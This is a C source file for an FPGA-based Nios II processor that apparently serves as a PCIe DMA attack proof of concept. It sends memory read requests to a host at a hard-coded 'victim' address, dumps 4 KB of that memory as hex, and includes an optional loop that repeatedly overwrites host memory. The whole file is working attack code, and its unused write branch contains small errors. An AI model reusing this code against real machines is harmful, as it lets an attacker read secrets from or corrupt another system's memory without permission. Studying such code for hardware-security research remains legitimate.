/*
 * NIOS PCIe memory transaction generator
 *
 */

#include <stdio.h>
#include <ctype.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>
#include "system.h"
#include "io.h"
#include "sys/alt_timestamp.h"
#include "altera_avalon_timer.h"
#include "pcie.h"
#include "pciefpga.h"
#include "pcietlp.h"
#include "baremetalsupport.h"
#include "pcie-backend.h"

#define COMPLETER_ID 0x8200
#define VICTIM_ADDRESS 0x871d000;
#define READ
#define READ_QWORDS 512


/* Make a memory request to the host, fetching a single 32 bit word.
 * Parameters:
 * address: 64 bit address to request
 * timeout: time in ns until we give up
 * Returns:
 * MemoryResponse structure containing details of response packet
 */
int memory_read(uint64_t address, uint64_t timeout,
  uint32_t *data_buffer, uint64_t data_buffer_length,
  uint32_t *returned_length)
{
  TLPDoubleWord tlp[64];
  static unsigned int tag=0;
  unsigned int tagSent = 0;
  int receivedCount = 0;
  int tlpLen = 0;
  unsigned long startTime = 0;
  unsigned long timeoutCycles = timeout*1000;
  int response;
  int status=0;

  tlpLen = create_memory_request(tlp, sizeof(tlp), TLPD_READ,
    COMPLETER_ID /* requester id */, tag, 0 /* loweraddress */,
    address, data_buffer_length);

#ifdef DEBUG1
  printf("Sending request TLP, tag %x\n", tag);
#endif

  startTime = read_hw_counter();
  send_tlp((TLPQuadWord *) tlp, tlpLen, NULL, 0, TDA_ALIGNED);
  tagSent = tag;
  tag = (tag+1) % 32;


  do {
    enum tlp_completion_status completion_status=0;
    uint16_t completer_id=0, requester_id=0;
    uint8_t tag=0;
    receivedCount = wait_for_tlp((TLPQuadWord *) tlp, sizeof(tlp));
    if (receivedCount < 3*4)
      continue;

    status = parse_memory_response(tlp, receivedCount,
      data_buffer, data_buffer_length,
      &completion_status, &completer_id, &requester_id,
      &tag, returned_length);

#ifdef DEBUG1
    printf("Received completion: address 0x");
    write_uint_64_hex(address, '0');
    printf(", status %u, tag %u, completion_status %u,"
        "returned_length %d, value 0x%x\n", status, tag, completion_status,
        returned_length, data_buffer[0]);
#endif

    if ((status==0) && (completion_status == TLPCS_SUCCESSFUL_COMPLETION) && (tag == tagSent)) {

#ifdef DEBUG1
    printf("Matched completion: status %u, tag %u, completion_status %u,"
        "returned_length %d, value 0x%x\n", status, tag, completion_status,
        returned_length, data_buffer[0]);
#endif

      return status;
    }
  } while(read_hw_counter() < (startTime + timeoutCycles));

  return status;
}


int memory_write(uint64_t address, uint64_t timeout,
  uint32_t *data_buffer, uint64_t data_buffer_length,
  uint32_t *returned_length)
{
  TLPDoubleWord tlp[64];
  static unsigned int tag=0;
  unsigned int tagSent = 0;
  int receivedCount = 0;
  int tlpLen = 0;
  unsigned long startTime = 0;
  unsigned long timeoutCycles = timeout*1000;
  int response;
  int status=0;

  tlpLen = create_memory_request(tlp, sizeof(tlp), TLPD_WRITE, 
    COMPLETER_ID /* requester id */, tag, 0 /* loweraddress */,
    address, data_buffer_length);

#ifdef DEBUG1
  printf("Sending request TLP, tag %x\n", tag);
#endif

  startTime = read_hw_counter();
  send_tlp((TLPQuadWord *) tlp, tlpLen, data_buffer, data_buffer_length, TDA_ALIGNED);
  tagSent = tag;
  tag = (tag+1) % 32;

  return status;
}


void hexdump(void *mem, unsigned int len)
{
  const unsigned int HEXDUMP_COLS = 16;
  unsigned int i, j;

  for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
  {
    /* print offset */
    if(i % HEXDUMP_COLS == 0)
    {
      printf("0x%06x: ", i);
    }

    /* print hex data */
    if(i < len)
    {
      printf("%02x ", 0xFF & ((char*)mem)[i]);
    }
    else /* end of block, just aligning for ASCII dump */
    {
      printf("   ");
    }

    /* print ASCII dump */
    if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
    {
      for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
      {
        if(j >= len) /* end of block, not really printing */
        {
          putchar(' ');
        }
        else if(isprint(((char*)mem)[j])) /* printable char */
        {
          putchar(0xFF & ((char*)mem)[j]);        
        }
        else /* other char */
        {
          putchar('.');
        }
      }
      putchar('\n');
    }
  }
}


int main()
{
  uint64_t victim_address = VICTIM_ADDRESS;
  uint32_t returned_length = 0;

  printf("Hello from Nios II!\n");
  usleep(2*1000*1000);
  printf("Starting...\n");
  alt_timestamp_start();

#ifdef READ
  printf("Reading...\n");
  uint32_t status = 0;
  uint64_t data_buffer[READ_QWORDS];
  memset(data_buffer, 0, sizeof(data_buffer));
  for (uint32_t i = 0; i < (sizeof(data_buffer) / sizeof(uint64_t)); i++) {
    do {
      status = memory_read(victim_address, 100000, &data_buffer[i],
          sizeof(uint64_t), &returned_length);
#ifdef DEBUG
      printf("read from 0x");
      write_uint_64_hex(victim_address, '0');
      printf(", status %d, returned_length %x, value 0x",
          status, returned_length);
      write_uint_64_hex(data_buffer[i], '0');
      printf("\n");
#endif
    } while (returned_length != sizeof(uint64_t));
    victim_address += sizeof(uint64_t);
  }
  printf("Done. Hex dumping...\n");
  hexdump(data_buffer, sizeof(data_buffer));
#endif

#ifdef WRITE
  printf("Writing...\n");
  memset(data_buffer, 'z', sizeof(data_buffer));
  while (1) {
    w = memory_write(victim_address, 100000, data_buffer, sizeof(data_buffer), &returned_length);
    printf("Writing %x, status = %d\n", (uint32_t) victim_address, w);
  }
#endif

  return 0;
}
